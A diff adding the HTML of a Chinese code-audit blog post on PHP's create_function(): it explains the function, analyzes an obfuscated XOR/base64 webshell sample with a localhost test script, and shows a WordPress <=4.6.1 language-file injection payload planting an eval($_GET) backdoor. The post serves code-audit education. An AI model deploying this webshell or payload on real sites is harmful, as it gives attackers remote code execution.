@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP,代码审计,create_function(),webshell,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="create_function() 函数示例 文件分析 wordpress &amp;lt;= 4.6.1 使用语言文件任意代码执行漏洞 create_function()被高版本 PHP 废弃    0x00 create_function()（PHP 4&amp;gt; = 4.0.1，PHP 5，PHP 7） create_function ——创建一个匿名（lambda样式）函数 1.说明 1crea">
+<meta name="keywords" content="PHP,代码审计,create_function(),webshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="create_function()函数和一个木马文件的测试">
+<meta property="og:url" content="https://cjjkkk.github.io/create-function-in-PHP/index.html">
+<meta property="og:site_name" content="Jacky Cheng">
+<meta property="og:description" content="create_function() 函数示例 文件分析 wordpress &amp;lt;= 4.6.1 使用语言文件任意代码执行漏洞 create_function()被高版本 PHP 废弃    0x00 create_function()（PHP 4&amp;gt; = 4.0.1，PHP 5，PHP 7） create_function ——创建一个匿名（lambda样式）函数 1.说明 1crea">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://cjjkkk.github.io/image/create-function-in-PHP/1.jpg">
+<meta property="og:updated_time" content="2020-02-20T08:51:46.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="create_function()函数和一个木马文件的测试">
+<meta name="twitter:description" content="create_function() 函数示例 文件分析 wordpress &amp;lt;= 4.6.1 使用语言文件任意代码执行漏洞 create_function()被高版本 PHP 废弃    0x00 create_function()（PHP 4&amp;gt; = 4.0.1，PHP 5，PHP 7） create_function ——创建一个匿名（lambda样式）函数 1.说明 1crea">
+<meta name="twitter:image" content="https://cjjkkk.github.io/image/create-function-in-PHP/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cjjkkk.github.io/create-function-in-PHP/">
+
+
+
+
+
+  <title>create_function()函数和一个木马文件的测试 | Jacky Cheng</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jacky Cheng</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cjjkkk.github.io/create-function-in-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jacky Cheng">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/image/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jacky Cheng">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">create_function()函数和一个木马文件的测试</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:34:36+08:00">
+                2020-02-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<ul>
+<li>create_function()</li>
+<li>函数示例</li>
+<li>文件分析</li>
+<li>wordpress &lt;= 4.6.1 使用语言文件任意代码执行漏洞</li>
+<li>create_function()被高版本 PHP 废弃</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="0x00-create-function"><a href="#0x00-create-function" class="headerlink" title="0x00 create_function()"></a>0x00 create_function()</h1><p>（PHP 4&gt; = 4.0.1，PHP 5，PHP 7）</p>
+<p>create_function ——创建一个匿名（lambda样式）函数</p>
+<h2 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h2><hr>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure>
+<p>根据传递的参数创建一个匿名函数，并为其返回一个唯一名称。</p>
+<a id="more"></a>
+<h2 id="2-参数"><a href="#2-参数" class="headerlink" title="2.参数"></a>2.参数</h2><hr>
+<p>通常，这些参数将作为单引号分隔的字符串传递。 使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，如果您使用双引号，则需要转义变量名，例如 \ $ avar。</p>
+<h2 id="3-返回值"><a href="#3-返回值" class="headerlink" title="3.返回值"></a>3.返回值</h2><hr>
+<p>以字符串形式返回唯一的函数名称，或在错误时返回FALSE。</p>
+<h1 id="0x01-函数示例"><a href="#0x01-函数示例" class="headerlink" title="0x01 函数示例"></a>0x01 函数示例</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，<code>create_function()</code>会创建一个lambda样式的匿名函数，此处名为<em>lambda_1</em>，其内容为计算<em>ln($a) + ln($b)</em>的值。</p>
+<p><code>create_function()</code>函数会在内部执行<code>eval()</code>，执行后面的<em>return</em>语句，属于<code>create_function()</code>中的第二个参数，因此该匿名函数的创建与执行过程同下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span><span class="params">($a,$b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>create_function()</code>函数在代码审计中，主要用来查找项目中的代码注入和回调后门的情况，熟悉了执行流程，我们可以熟练的实现对代码注入的 payload 构造，从而进行漏洞挖掘和找出存在的缺陷。</p>
+<h1 id="0x02-文件分析"><a href="#0x02-文件分析" class="headerlink" title="0x02 文件分析"></a>0x02 文件分析</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filename : 6661.php</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Gnirts_Vnoc</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str_len = strlen($str);</span><br><span class="line">	$str_tmp = base64_decode(<span class="string">'ej9UIXAk'</span>);</span><br><span class="line">    $tmp_len = strlen($str_tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $str_len; $i++) &#123;</span><br><span class="line">        $str[$i] = $str[$i] ^ $str_tmp[$i % $tmp_len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xeh_Vnoc</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $string=<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($str)<span class="number">-1</span>; $i+=<span class="number">2</span>)&#123;</span><br><span class="line">        $string .= chr(hexdec($str[$i].$str[$i+<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ID1 = base64_decode($_POST[<span class="string">"AVG"</span>]);</span><br><span class="line">$ID2 = Gnirts_Vnoc($ID1);</span><br><span class="line">$VALUE1 = base64_decode($_POST[$ID2]);</span><br><span class="line">$VALUE2 = Gnirts_Vnoc($VALUE1);</span><br><span class="line">$CR = create_function(<span class="string">""</span>, $VALUE2);</span><br><span class="line">$CR();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个代码仔细一看其实并不算复杂，传入一个<code>AVG</code>作为私钥，生成用于执行命令的<code>$ID2</code>，但问题就在于输入的命令需要经过base64加密和<code>Gnirts_Vnoc()</code>的加密才能正确执行。</p>
+<p>我们将目光放到<code>Gnirts_Vnoc()</code>函数上，这个函数通过对给定字符串的异或运算，生成密文，同时能将密文通过异或运算进行解密，那么正确的参数传递需要经过该函数的加密才能执行。于是我们构建如下脚本用于测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filename : 6662.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Gnirts_Vnoc</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str_len = strlen($str);</span><br><span class="line">    $str_tmp = base64_decode(<span class="string">'ej9UIXAk'</span>);</span><br><span class="line">    $tmp_len = strlen($str_tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $str_len; $i++) &#123;</span><br><span class="line">        $str[$i] = $str[$i] ^ $str_tmp[$i % $tmp_len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$command = base64_encode(Gnirts_Vnoc(<span class="string">"phpinfo();"</span>));</span><br><span class="line">$url=<span class="string">'http://localhost/test/6661'</span>.<span class="string">'?AVG=MQ==&amp;K='</span>.$command;</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line">$html = file_get_contents($url);</span><br><span class="line"><span class="keyword">echo</span> $html;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="\image\create-function-in-PHP\1.jpg" alt="1"></p>
+<h1 id="0x03-wordpress-lt-4-6-1-使用语言文件任意代码执行漏洞"><a href="#0x03-wordpress-lt-4-6-1-使用语言文件任意代码执行漏洞" class="headerlink" title="0x03 wordpress &lt;= 4.6.1 使用语言文件任意代码执行漏洞"></a>0x03 wordpress &lt;= 4.6.1 使用语言文件任意代码执行漏洞</h1><p>接下来我们看这个版本的<code>WordPress</code>中，一处用到<code>create_function</code>的地方，在<em>wp-includes/pomo/translations.php</em>第<code>203-209</code>行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Makes a function, which will return the right translation index, according to the</span></span><br><span class="line"><span class="comment"> * plural forms header</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $nplurals</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $expression</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_plural_form_function</span><span class="params">($nplurals, $expression)</span> </span>&#123;</span><br><span class="line">    $expression = str_replace(<span class="string">'n'</span>, <span class="string">'$n'</span>, $expression);</span><br><span class="line">    $func_body = <span class="string">"</span></span><br><span class="line"><span class="string">        \$index = (int)($expression);</span></span><br><span class="line"><span class="string">        return (\$index &lt; $nplurals)? \$index : $nplurals - 1;"</span>;</span><br><span class="line">    <span class="keyword">return</span> create_function(<span class="string">'$n'</span>, $func_body);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们看一下正常的字体文件<em>zh_CN.mo</em>，其中有这么一段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Plural-Forms: nplurals=1; plural=n;</span><br><span class="line">X-Generator: Poedit 1.8.7</span><br><span class="line">Project-Id-Version: 4.3.x</span><br></pre></td></tr></table></figure>
+<p><code>Plural-Froms</code>这个header就是上面的函数所需要处理的，其中<code>nplurals</code>的值即为<code>$nplurals</code>的值，而<code>plural</code>的值正是我们需要的<code>$expression</code>的值。所以我们将字体文件进行如下改动：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plural-Forms: nplurals=1; plural=n;&#125;eval($_GET[c]);/*;</span><br></pre></td></tr></table></figure>
+<p>我们payload中的<code>)</code>首先闭合了前面的<code>(</code>，然后<code>;</code>结束前面的语句，接着是我们的一句话木马，然后用<code>/*</code>将后面不必要的部分注释掉，通过这样，我们就将payload完整的传入了<code>create_function</code>，在其创建函数时我们的payload就会被执行，由于访问每个文件时都要用这个对字体文件解析的结果对文件进行翻译，所以我们访问任何文件都可以触发这个payload。</p>
+<h1 id="0x04-create-function-被高版本-PHP-废弃"><a href="#0x04-create-function-被高版本-PHP-废弃" class="headerlink" title="0x04 create_function()被高版本 PHP 废弃"></a>0x04 create_function()被高版本 PHP 废弃</h1><p>从<code>PHP 7.2.0</code>开始，<code>create_function()</code>被废弃。</p>
+<p><br></p>
+<p><strong>参考</strong></p>
+<p><a href="https://www.php.net/manual/en/function.create-function.php" target="_blank" rel="noopener">PHP官方手册</a></p>
+<p><a href="https://www.cnblogs.com/-qing-/p/10816089.html#_label6" target="_blank" rel="noopener">代码审计之create_function()函数</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    	<br>
+    	<br>
+        <div style="text-align:center;color: #000000;font-size:14px;">-------------本文结束<i class="fa fa-gift"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/create-function-in-PHP/">create_function()函数和一个木马文件的测试</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Jacky Cheng 的个人博客">Jacky Cheng</a></p>
+  <p><span>发布时间:</span>2020年02月20日 - 16:02</p>
+  <p><span>最后更新:</span>2020年02月20日 - 16:02</p>
+  <p><span>原始链接:</span><a href="/create-function-in-PHP/" title="create_function()函数和一个木马文件的测试">https://cjjkkk.github.io/create-function-in-PHP/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://cjjkkk.github.io/create-function-in-PHP/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+	  $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	    });
+    });  
+</script>
+<br>
+
+      
+    </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>想喝快乐水</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/image/wechatpay.jpg" alt="Jacky Cheng 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/image/alipay.jpg" alt="Jacky Cheng 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+            <a href="/tags/create-function/" rel="tag"><i class="fa fa-tag"></i> create_function()</a>
+          
+            <a href="/tags/webshell/" rel="tag"><i class="fa fa-tag"></i> webshell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/require-in-lua/" rel="next" title="Lua语言中的模块调用">
+                <i class="fa fa-chevron-left"></i> Lua语言中的模块调用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div id="gitalk-container">
+  </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/image/avatar.jpg" alt="Jacky Cheng">
+            
+              <p class="site-author-name" itemprop="name">Jacky Cheng</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">67</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/CJJKKK" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:55555cjk@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://space.bilibili.com/251141019" target="_blank" title="BiliBili">
+                      
+                        <i class="fa fa-fw fa-youtube-play"></i>BiliBili</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://music.163.com/#/user/home?id=98370335" target="_blank" title="CloudMusic">
+                      
+                        <i class="fa fa-fw fa-music"></i>CloudMusic</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <br>
+<br>
+
+	<div id="music163player">
+    	<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="280" height="86" src="//music.163.com/outchain/player?type=2&id=526413163&auto=1&height=66">
+    	</iframe>
+	</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-create-function"><span class="nav-text">0x00 create_function()</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-说明"><span class="nav-text">1.说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-参数"><span class="nav-text">2.参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-返回值"><span class="nav-text">3.返回值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-函数示例"><span class="nav-text">0x01 函数示例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-文件分析"><span class="nav-text">0x02 文件分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-wordpress-lt-4-6-1-使用语言文件任意代码执行漏洞"><span class="nav-text">0x03 wordpress &lt;= 4.6.1 使用语言文件任意代码执行漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-create-function-被高版本-PHP-废弃"><span class="nav-text">0x04 create_function()被高版本 PHP 废弃</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
